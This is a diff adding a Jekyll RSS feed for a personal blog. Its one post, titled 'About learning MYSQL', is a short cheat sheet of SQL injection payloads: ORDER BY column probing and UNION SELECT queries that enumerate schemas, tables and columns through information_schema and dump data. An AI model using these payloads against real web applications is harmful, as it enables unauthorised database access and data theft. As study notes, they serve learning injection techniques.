@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>void0red's blog</title>
+    <description>NEVER GIVE UP</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sat, 30 Sep 2017 13:35:19 +0800</pubDate>
+    <lastBuildDate>Sat, 30 Sep 2017 13:35:19 +0800</lastBuildDate>
+    <generator>Jekyll v3.6.0</generator>
+    
+      <item>
+        <title>About learning MYSQL</title>
+        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+id=? order by n
+union select null,null,~,n
+
+#find_schema:
+union select 1,2,~,group_concat(schema_name),~,n from information_schema.schemata
+#find_tables:
+union select 1,2,~,group_concat(table_name),~,n from information_schema.tables where table_schema=&quot;~~&quot;
+#find_columns:
+union select 1,2,~,group_concat(column_name),~,n from information_schema.columns where table_schema=&quot;~~&quot; and table_name=&quot;~~&quot;
+
+#get data
+union select 1,2,~,group_concat(column),~,n from schema.table
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+</description>
+        <pubDate>Sun, 24 Sep 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/09/24/mysql.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/09/24/mysql.html</guid>
+        
+        <category>others</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
